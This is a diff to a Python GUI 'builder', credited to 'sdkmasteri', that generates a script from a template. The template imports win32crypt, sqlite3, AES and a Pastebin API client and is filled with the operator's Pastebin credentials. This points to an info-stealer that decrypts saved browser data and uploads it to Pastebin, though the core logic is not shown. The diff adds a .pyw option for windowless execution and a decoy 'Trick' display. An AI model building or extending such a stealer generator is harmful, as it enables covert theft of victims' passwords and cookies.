@@ -6,10 +6,10 @@ def resource(relative_path):
         os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base_path, relative_path)
 icon = resource('app.ico')
-def create_prompt(api, name, password):
-    date = datetime.datetime.now().strftime("%A, %d. %B %Y")
+def create_prompt(api, name, password, trick_enable, type):
+    date = str(datetime.datetime.now().strftime("%d.%m.%y, %H.%M"))
     try:
-        with open(f'{date}.py', 'x') as f:
+        with open(date+type, 'x') as f:
             f.writelines(f'''import requests, os, sys, time, ipaddress, socket, datetime, re, json, win32crypt, base64, sqlite3, shutil; from pastebin import PastebinAPI; from Cryptodome.Cipher import AES
 api_dev_key = "{api}"
 username = "{name}"
@@ -145,13 +145,14 @@ def animated_text(text: str | list, timer: int | float):
         for values in text:
             print(values)
             time.sleep(timer)
-animated_text(logo[0], 0.01)
-animated_text(f"https://pastebin.com/u/{{username}}\\n", 0.05)
-animated_text(logo[1], 0.01)
-input()
+if {trick_enable} is True:
+    animated_text(logo[0], 0.01)
+    animated_text(f"https://pastebin.com/u/{{username}}\\n", 0.05)
+    animated_text(logo[1], 0.01)
+    input()
 #</trick>''')
             f.close()
-            os.startfile(os.path.realpath(f.name.replace(date + '.py', '')))
+            os.startfile(os.path.realpath(f.name.replace(date+type, '')))
         messagebox.showinfo(title='Done!', message='File created!') 
     except Exception as e:
         messagebox.showerror(title='Error Occured!', message=e)
@@ -162,7 +163,7 @@ def about():
     aboutwindow.geometry('240x100')
     aboutwindow.resizable(False, False)
     aboutwindow.iconbitmap(icon)
-    ver = ttk.Label(aboutwindow, text='Ver. 1.1').pack()
+    ver = ttk.Label(aboutwindow, text='Ver. 1.2').pack()
     creator = ttk.Label(aboutwindow, text='sdkmasteri©').pack()
     contact_ds = ttk.Label(aboutwindow, text='Discord: sakenzo').pack()
     contact_tg = ttk.Label(aboutwindow, text='Telegram: @sakenzo1337').pack()
@@ -175,17 +176,24 @@ frm.grid()
 mainmenu = Menu(frm) 
 root.config(menu=mainmenu)
 infomenu = Menu(mainmenu, tearoff=0)
+typemenu = Menu(infomenu, tearoff=0)
 infomenu.add_command(label="About", command=lambda: about())
+infomenu.add_cascade(label='File Type', menu=typemenu)
+file_type = StringVar(value='.py')
+typemenu.add_checkbutton(label='.py', variable=file_type, offvalue='.pyw', onvalue='.py')
+typemenu.add_checkbutton(label='.pyw', variable=file_type, offvalue='.py', onvalue='.pyw')
 mainmenu.add_cascade(label="Info", menu=infomenu)
-ttk.Label(frm, text='Account Name').grid(column=0, row=0)
+ttk.Label(frm, text='Account Name').grid(column=0, row=0, sticky='W')
 NAME = ttk.Entry(frm)
 NAME.grid(column=1, row=0)
-ttk.Label(frm, text='Account Password').grid(column=0, row=1)
+ttk.Label(frm, text='Account Password').grid(column=0, row=1, sticky='W')
 PASSWORD = ttk.Entry(frm)
 PASSWORD.grid(column=1, row=1)
-ttk.Label(frm, text='API Key').grid(column=0, row=2)
+ttk.Label(frm, text='API Key').grid(column=0, row=2, sticky='W')
 API_KEY = ttk.Entry(frm)
 API_KEY.grid(column=1, row=2)
-create = ttk.Button(frm, text="Create", command=lambda: create_prompt(api=API_KEY.get(), name=NAME.get(), password=PASSWORD.get()))
-create.grid(column=1, row=3)
+tricks = BooleanVar(value=True)
+trick = ttk.Checkbutton(frm, text='Trick', variable=tricks, offvalue=False, onvalue=True).grid(column=0, row=3, sticky='W')
+create = ttk.Button(frm, text="Create", command=lambda: create_prompt(api=API_KEY.get(), name=NAME.get(), password=PASSWORD.get(), trick_enable=tricks.get(), type=file_type.get()))
+create.grid(column=1, row=3, sticky='E')
 root.mainloop()
